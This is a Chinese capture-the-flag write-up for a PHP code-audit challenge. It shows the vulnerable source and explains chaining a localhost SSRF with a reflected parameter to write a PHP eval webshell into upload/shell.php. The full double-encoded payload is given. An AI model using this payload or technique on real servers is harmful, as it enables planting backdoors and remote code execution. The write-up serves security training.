## sycsec_audit

分类：脚本开发
## write-up

这是一道代码审计的题目，源代码如下：

```PHP
<?php
    if(isset($_GET) && !empty($_GET)) {
        $url = $_GET['file'];
        $path = "upload/" . $_GET['path'];
    } else {
        show_source(__FILE__);
        exit();
    }
    
    if(strpos($path, '..') > -1) {
        die("SYCwaf!");
    }

    if(strpos($url, 'http://127.0.0.1/') === 0) {
        file_put_contents($path, file_get_contents($url));
        echo "console.log($path update successed!)";
    } else {
        echo "Hello.Geeker";
    }
?>
```

这道题目，首先接受file和path参数，file的作用是文件读取的位置，path代表的是文件存储的位置。且file参数的值必须是以`http://127.0.0.1/`开始的才行。

对于这道题目的思路，肯定是直接能写一个shell进去，直接可以看服务器上有哪些文件了。首先需要构造的一个内容是我们读取的文件中必须要包含后门代码。观察代码我们发现含语句：`echo "console.log($path update successed!)";`这条语句能够将$path的值输出，且该参数是我们所能够控制的。构造含有一句话木马的页面回显的payload：`http://127.0.0.1/?file=http://127.0.0.1/&path=%3C?php%20eval($_POST[a]);%20?%3E`此时页面中可以产生后门代码。

接着我们重新在构造url链接，让新的url的file参数为以上的payload。此处有一个小坑，需要将&字符进行一次编码，如果不编码的话，在该&符号的时候会进行截断。将&进行一次编码即可。

在这儿还有一个坑是，由于`file_get_contents`函数其实是二次访问链接，需要将第一条payload中的参数部分进行url编码两次即可。这儿由于访问的是本地主机自己，也可以认为这是ssrf攻击。

最终的payload：`http://127.0.0.1/index.php?file=http://127.0.0.1/index.php?file=http://127.0.0.1/%26path=%253C%253Fphp%2520eval%2528%2524_POST%255Ba%255D%2529%253B%2520%253F%253E&path=shell.php`

此时在生成一个`upload/shell.php`。